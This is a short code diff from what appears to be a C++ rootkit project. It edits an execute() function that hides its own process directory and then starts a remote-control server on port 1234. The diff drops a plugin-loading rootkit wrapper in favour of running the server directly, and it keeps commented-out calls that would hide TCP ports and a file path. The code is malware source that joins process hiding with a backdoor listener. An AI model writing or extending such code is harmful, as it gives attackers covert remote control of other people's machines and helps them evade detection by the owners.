@@ -1,31 +1,22 @@
-//
-// Created by idan on 1/1/24.
-//
-
-#include "../basic/basic_rootkit.h"
 #include <unistd.h>
 
 #include "hider/hider.h"
 
 #include "remote_control/remote_control_server.h"
 
+#define REMOTE_PORT 1234
+
 void execute() {
     int mypid = getpid();
     hide_process_dir(mypid);
 
-    basic_rootkit rootkit;
-
-    id_value id = rootkit.load_plugin(std::make_unique<remote_control_server>(1234));
-    rootkit.run_plugin(id, false);
-
+    remote_control_server server(REMOTE_PORT);
+    server.run();
 
 //    hide_tcp4_port(1234);
 //    hide_tcp6_port(63342);
-//    hide_absolute_path("/home/idan/Downloads");
+//    hide_absolute_path("/home/user/Downloads");
 //    hide_process_dir(1234);
-
-//    reports_test();
-
 
 //    unhide_process_dir(mypid);
 }
